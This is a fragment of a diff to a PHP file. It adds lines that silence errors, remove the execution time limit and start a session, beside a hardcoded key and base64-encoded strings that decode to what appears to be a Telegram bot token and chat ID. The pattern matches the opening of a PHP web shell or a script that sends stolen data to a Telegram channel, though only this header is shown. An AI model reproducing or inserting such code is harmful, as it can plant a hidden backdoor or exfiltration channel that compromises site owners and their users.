@@ -1,4 +1,7 @@
 <?php
+error_reporting(0);
+set_time_limit(0);
+session_start();
 $k='kontolbengkak';
 $tk = base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
 $cid = base64_decode("ODkzMDE3NDQ2Mw==");
